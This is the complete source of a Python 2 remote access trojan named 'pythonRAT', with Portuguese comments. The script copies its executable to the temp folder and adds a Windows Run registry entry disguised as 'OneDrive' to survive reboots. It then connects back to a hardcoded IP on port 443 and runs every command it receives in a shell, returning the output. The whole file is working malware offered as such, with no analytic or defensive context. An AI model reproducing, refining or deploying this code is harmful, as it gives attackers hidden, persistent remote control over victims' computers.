import socket
import time
import subprocess
import tempfile
import os




#############################
ip = "192.168.5.128"
file = "Builder.exe"
#############################





















TEMPDIR = tempfile.gettempdir()

DIRETORIO = os.path.dirname(os.path.abspath(__file__))

def persis(): # Persistencia
    try:
        os.system("copy " + file + " " + TEMPDIR)
    except:
        print 'Erro na copia do arquivo!'
        pass

    try:
        FNULL = open(os.devnull, 'w')
        subprocess.Popen("REG ADD HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\"
                         " /v OneDrive /d " + TEMPDIR + "\\" + file, stdout=FNULL, stderr=FNULL)
    except:
        print 'Erro na criacao do registro de inicializacao do sistema.'
        pass



def conexao(ip): # Faz a conexao
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip , 443))
        s.send('[pythonRAT say] Connected! \n')
        return s  #return socket
    except Exception as e:
        print "Connection Error" , e
        return None


def listen(s): # Escuta o "HACKER"
   try:
    while True:
        data = s.recv(1024)
        if data[:-1] == 'exit':
            s.send('\nThanks for using pythonRAT , bye! \n')
            exit(0)
            s.close




        else:
            prompt(s, data[:-1])

   except:
       error(s)




def prompt(s, data): # Faz os comandos no CMD
    try:
        proc = subprocess.Popen(data, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        saida = proc.stdout.read() + proc.stderr.read()
        s.send(saida+'\n')
    except:
        error(s)



def error(s):
    if s:
        s.close
    main()



def main():
    while True:
        s_conectado = conexao(ip)
        if s_conectado:
            listen(s_conectado)
        else:
            print 'Conexao deu erro, tentando novamente'
            time.sleep(5)


persis()
main()



